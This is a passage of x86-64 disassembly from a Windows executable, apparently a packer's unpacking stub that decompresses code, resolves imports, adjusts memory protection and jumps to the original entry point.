   14000f62c:	75 f0                	jne    0x14000f61e
   14000f62e:	f3 c3                	repz ret
   14000f630:	fc                   	cld
   14000f631:	41 5b                	pop    %r11
   14000f633:	eb 08                	jmp    0x14000f63d
   14000f635:	48 ff c6             	inc    %rsi
   14000f638:	88 17                	mov    %dl,(%rdi)
   14000f63a:	48 ff c7             	inc    %rdi
   14000f63d:	8a 16                	mov    (%rsi),%dl
   14000f63f:	01 db                	add    %ebx,%ebx
   14000f641:	75 0a                	jne    0x14000f64d
   14000f643:	8b 1e                	mov    (%rsi),%ebx
   14000f645:	48 83 ee fc          	sub    $0xfffffffffffffffc,%rsi
   14000f649:	11 db                	adc    %ebx,%ebx
   14000f64b:	8a 16                	mov    (%rsi),%dl
   14000f64d:	72 e6                	jb     0x14000f635
   14000f64f:	8d 41 01             	lea    0x1(%rcx),%eax
   14000f652:	eb 07                	jmp    0x14000f65b
   14000f654:	ff c8                	dec    %eax
   14000f656:	41 ff d3             	call   *%r11
   14000f659:	11 c0                	adc    %eax,%eax
   14000f65b:	41 ff d3             	call   *%r11
   14000f65e:	11 c0                	adc    %eax,%eax
   14000f660:	01 db                	add    %ebx,%ebx
   14000f662:	75 0a                	jne    0x14000f66e
   14000f664:	8b 1e                	mov    (%rsi),%ebx
   14000f666:	48 83 ee fc          	sub    $0xfffffffffffffffc,%rsi
   14000f66a:	11 db                	adc    %ebx,%ebx
   14000f66c:	8a 16                	mov    (%rsi),%dl
   14000f66e:	73 e4                	jae    0x14000f654
   14000f670:	83 e8 03             	sub    $0x3,%eax
   14000f673:	72 19                	jb     0x14000f68e
   14000f675:	c1 e0 08             	shl    $0x8,%eax
   14000f678:	0f b6 d2             	movzbl %dl,%edx
   14000f67b:	09 d0                	or     %edx,%eax
   14000f67d:	48 ff c6             	inc    %rsi
   14000f680:	83 f0 ff             	xor    $0xffffffff,%eax
   14000f683:	74 58                	je     0x14000f6dd
   14000f685:	d1 f8                	sar    $1,%eax
   14000f687:	48 63 e8             	movslq %eax,%rbp
   14000f68a:	72 38                	jb     0x14000f6c4
   14000f68c:	eb 0e                	jmp    0x14000f69c
   14000f68e:	01 db                	add    %ebx,%ebx
   14000f690:	75 08                	jne    0x14000f69a
   14000f692:	8b 1e                	mov    (%rsi),%ebx
   14000f694:	48 83 ee fc          	sub    $0xfffffffffffffffc,%rsi
   14000f698:	11 db                	adc    %ebx,%ebx
   14000f69a:	72 28                	jb     0x14000f6c4
   14000f69c:	ff c1                	inc    %ecx
   14000f69e:	01 db                	add    %ebx,%ebx
   14000f6a0:	75 08                	jne    0x14000f6aa
   14000f6a2:	8b 1e                	mov    (%rsi),%ebx
   14000f6a4:	48 83 ee fc          	sub    $0xfffffffffffffffc,%rsi
   14000f6a8:	11 db                	adc    %ebx,%ebx
   14000f6aa:	72 18                	jb     0x14000f6c4
   14000f6ac:	41 ff d3             	call   *%r11
   14000f6af:	11 c9                	adc    %ecx,%ecx
   14000f6b1:	01 db                	add    %ebx,%ebx
   14000f6b3:	75 08                	jne    0x14000f6bd
   14000f6b5:	8b 1e                	mov    (%rsi),%ebx
   14000f6b7:	48 83 ee fc          	sub    $0xfffffffffffffffc,%rsi
   14000f6bb:	11 db                	adc    %ebx,%ebx
   14000f6bd:	73 ed                	jae    0x14000f6ac
   14000f6bf:	83 c1 02             	add    $0x2,%ecx
   14000f6c2:	eb 05                	jmp    0x14000f6c9
   14000f6c4:	41 ff d3             	call   *%r11
   14000f6c7:	11 c9                	adc    %ecx,%ecx
   14000f6c9:	48 81 fd 00 fb ff ff 	cmp    $0xfffffffffffffb00,%rbp
   14000f6d0:	83 d1 02             	adc    $0x2,%ecx
   14000f6d3:	e8 1a ff ff ff       	call   0x14000f5f2
   14000f6d8:	e9 60 ff ff ff       	jmp    0x14000f63d
   14000f6dd:	5e                   	pop    %rsi
   14000f6de:	48 89 f7             	mov    %rsi,%rdi
   14000f6e1:	56                   	push   %rsi
   14000f6e2:	48 89 f7             	mov    %rsi,%rdi
   14000f6e5:	48 c7 c6 00 2a 00 00 	mov    $0x2a00,%rsi
   14000f6ec:	b2 02                	mov    $0x2,%dl
   14000f6ee:	53                   	push   %rbx
   14000f6ef:	57                   	push   %rdi
   14000f6f0:	48 8d 4c 37 fd       	lea    -0x3(%rdi,%rsi,1),%rcx
   14000f6f5:	5e                   	pop    %rsi
   14000f6f6:	56                   	push   %rsi
   14000f6f7:	5b                   	pop    %rbx
   14000f6f8:	eb 2f                	jmp    0x14000f729
   14000f6fa:	48 39 ce             	cmp    %rcx,%rsi
   14000f6fd:	73 32                	jae    0x14000f731
   14000f6ff:	56                   	push   %rsi
   14000f700:	5e                   	pop    %rsi
   14000f701:	ac                   	lods   (%rsi),%al
   14000f702:	3c 80                	cmp    $0x80,%al
   14000f704:	72 0a                	jb     0x14000f710
   14000f706:	3c 8f                	cmp    $0x8f,%al
   14000f708:	77 06                	ja     0x14000f710
   14000f70a:	80 7e fe 0f          	cmpb   $0xf,-0x2(%rsi)
   14000f70e:	74 06                	je     0x14000f716
   14000f710:	2c e8                	sub    $0xe8,%al
   14000f712:	3c 01                	cmp    $0x1,%al
   14000f714:	77 e4                	ja     0x14000f6fa
   14000f716:	48 39 ce             	cmp    %rcx,%rsi
   14000f719:	73 16                	jae    0x14000f731
   14000f71b:	56                   	push   %rsi
   14000f71c:	ad                   	lods   (%rsi),%eax
   14000f71d:	28 d0                	sub    %dl,%al
   14000f71f:	75 df                	jne    0x14000f700
   14000f721:	5f                   	pop    %rdi
   14000f722:	0f c8                	bswap  %eax
   14000f724:	29 f8                	sub    %edi,%eax
   14000f726:	01 d8                	add    %ebx,%eax
   14000f728:	ab                   	stos   %eax,(%rdi)
   14000f729:	48 39 ce             	cmp    %rcx,%rsi
   14000f72c:	73 03                	jae    0x14000f731
   14000f72e:	ac                   	lods   (%rsi),%al
   14000f72f:	eb df                	jmp    0x14000f710
   14000f731:	5b                   	pop    %rbx
   14000f732:	5e                   	pop    %rsi
   14000f733:	48 83 ec 28          	sub    $0x28,%rsp
   14000f737:	48 8d be 00 d0 00 00 	lea    0xd000(%rsi),%rdi
   14000f73e:	8b 07                	mov    (%rdi),%eax
   14000f740:	09 c0                	or     %eax,%eax
   14000f742:	74 4a                	je     0x14000f78e
   14000f744:	8b 5f 04             	mov    0x4(%rdi),%ebx
   14000f747:	48 8d 8c 30 00 f0 00 	lea    0xf000(%rax,%rsi,1),%rcx
   14000f74e:	00 
   14000f74f:	48 01 f3             	add    %rsi,%rbx
   14000f752:	48 83 c7 08          	add    $0x8,%rdi
   14000f756:	ff 15 18 09 00 00    	call   *0x918(%rip)        # 0x140010074
   14000f75c:	48 95                	xchg   %rax,%rbp
   14000f75e:	8a 07                	mov    (%rdi),%al
   14000f760:	48 ff c7             	inc    %rdi
   14000f763:	08 c0                	or     %al,%al
   14000f765:	74 d7                	je     0x14000f73e
   14000f767:	48 89 f9             	mov    %rdi,%rcx
   14000f76a:	48 89 fa             	mov    %rdi,%rdx
   14000f76d:	ff c8                	dec    %eax
   14000f76f:	f2 ae                	repnz scas (%rdi),%al
   14000f771:	48 89 e9             	mov    %rbp,%rcx
   14000f774:	ff 15 0a 09 00 00    	call   *0x90a(%rip)        # 0x140010084
   14000f77a:	48 09 c0             	or     %rax,%rax
   14000f77d:	74 09                	je     0x14000f788
   14000f77f:	48 89 03             	mov    %rax,(%rbx)
   14000f782:	48 83 c3 08          	add    $0x8,%rbx
   14000f786:	eb d6                	jmp    0x14000f75e
   14000f788:	ff 25 ee 08 00 00    	jmp    *0x8ee(%rip)        # 0x14001007c
   14000f78e:	48 83 c4 28          	add    $0x28,%rsp
   14000f792:	48 83 c7 04          	add    $0x4,%rdi
   14000f796:	48 8d 5e fc          	lea    -0x4(%rsi),%rbx
   14000f79a:	31 c0                	xor    %eax,%eax
   14000f79c:	8a 07                	mov    (%rdi),%al
   14000f79e:	48 ff c7             	inc    %rdi
   14000f7a1:	09 c0                	or     %eax,%eax
   14000f7a3:	74 23                	je     0x14000f7c8
   14000f7a5:	3c ef                	cmp    $0xef,%al
   14000f7a7:	77 11                	ja     0x14000f7ba
   14000f7a9:	48 01 c3             	add    %rax,%rbx
   14000f7ac:	48 8b 03             	mov    (%rbx),%rax
   14000f7af:	48 0f c8             	bswap  %rax
   14000f7b2:	48 01 f0             	add    %rsi,%rax
   14000f7b5:	48 89 03             	mov    %rax,(%rbx)
   14000f7b8:	eb e0                	jmp    0x14000f79a
   14000f7ba:	24 0f                	and    $0xf,%al
   14000f7bc:	c1 e0 10             	shl    $0x10,%eax
   14000f7bf:	66 8b 07             	mov    (%rdi),%ax
   14000f7c2:	48 83 c7 02          	add    $0x2,%rdi
   14000f7c6:	eb e1                	jmp    0x14000f7a9
   14000f7c8:	48 8b 2d bd 08 00 00 	mov    0x8bd(%rip),%rbp        # 0x14001008c
   14000f7cf:	48 8d be 00 f0 ff ff 	lea    -0x1000(%rsi),%rdi
   14000f7d6:	bb 00 10 00 00       	mov    $0x1000,%ebx
   14000f7db:	50                   	push   %rax
   14000f7dc:	49 89 e1             	mov    %rsp,%r9
   14000f7df:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000f7e5:	48 89 da             	mov    %rbx,%rdx
   14000f7e8:	48 89 f9             	mov    %rdi,%rcx
   14000f7eb:	48 83 ec 20          	sub    $0x20,%rsp
   14000f7ef:	ff d5                	call   *%rbp
   14000f7f1:	48 8d 87 af 01 00 00 	lea    0x1af(%rdi),%rax
   14000f7f8:	80 20 7f             	andb   $0x7f,(%rax)
   14000f7fb:	80 60 28 7f          	andb   $0x7f,0x28(%rax)
   14000f7ff:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   14000f804:	4d 8b 01             	mov    (%r9),%r8
   14000f807:	48 89 da             	mov    %rbx,%rdx
   14000f80a:	48 89 f9             	mov    %rdi,%rcx
   14000f80d:	ff d5                	call   *%rbp
   14000f80f:	48 83 c4 28          	add    $0x28,%rsp
   14000f813:	c6 05 2d 00 00 00 fc 	movb   $0xfc,0x2d(%rip)        # 0x14000f847
   14000f81a:	48 8d 8e 00 f0 ff ff 	lea    -0x1000(%rsi),%rcx
   14000f821:	6a 01                	push   $0x1
   14000f823:	5a                   	pop    %rdx
   14000f824:	4d 31 c0             	xor    %r8,%r8
   14000f827:	50                   	push   %rax
   14000f828:	e8 1a 00 00 00       	call   0x14000f847
   14000f82d:	58                   	pop    %rax
   14000f82e:	5d                   	pop    %rbp
   14000f82f:	5f                   	pop    %rdi
   14000f830:	5e                   	pop    %rsi
   14000f831:	5b                   	pop    %rbx
   14000f832:	48 8d 44 24 80       	lea    -0x80(%rsp),%rax
   14000f837:	6a 00                	push   $0x0
   14000f839:	48 39 c4             	cmp    %rax,%rsp
   14000f83c:	75 f9                	jne    0x14000f837
   14000f83e:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   14000f842:	e9 89 1c ff ff       	jmp    0x1400014d0
   14000f847:	c3                   	ret
   14000f848:	56                   	push   %rsi
   14000f849:	48 8d 35 e8 b7 ff ff 	lea    -0x4818(%rip),%rsi        # 0x14000b038
   14000f850:	48 ad                	lods   (%rsi),%rax
   14000f852:	48 85 c0             	test   %rax,%rax
   14000f855:	74 14                	je     0x14000f86b
   14000f857:	51                   	push   %rcx
   14000f858:	52                   	push   %rdx
   14000f859:	41 50                	push   %r8
   14000f85b:	48 83 ec 28          	sub    $0x28,%rsp
   14000f85f:	ff d0                	call   *%rax
   14000f861:	48 83 c4 28          	add    $0x28,%rsp
   14000f865:	41 58                	pop    %r8
   14000f867:	5a                   	pop    %rdx
   14000f868:	59                   	pop    %rcx
   14000f869:	eb e5                	jmp    0x14000f850
   14000f86b:	5e                   	pop    %rsi
   14000f86c:	c3                   	ret
   14000f86d:	00 00                	add    %al,(%rax)
   14000f86f:	00 98 f8 00 40 01    	add    %bl,0x14000f8(%rax)
   14000f875:	00 00                	add    %al,(%rax)
   14000f877:	00 a0 f8 00 40 01    	add    %ah,0x14000f8(%rax)
   14000f87d:	00 00                	add    %al,(%rax)
   14000f87f:	00 ac 90 00 40 01 00 	add    %ch,0x14000(%rax,%rdx,4)
   14000f886:	00 00                	add    %al,(%rax)
   14000f888:	a0 f8 00 40 01 00 00 	movabs 0x14000f8,%al
   14000f88f:	00 00 
	...
   14000f89d:	00 00                	add    %al,(%rax)
   14000f89f:	00 47 f8             	add    %al,-0x8(%rdi)
   14000f8a2:	00 40 01             	add    %al,0x1(%rax)
	...
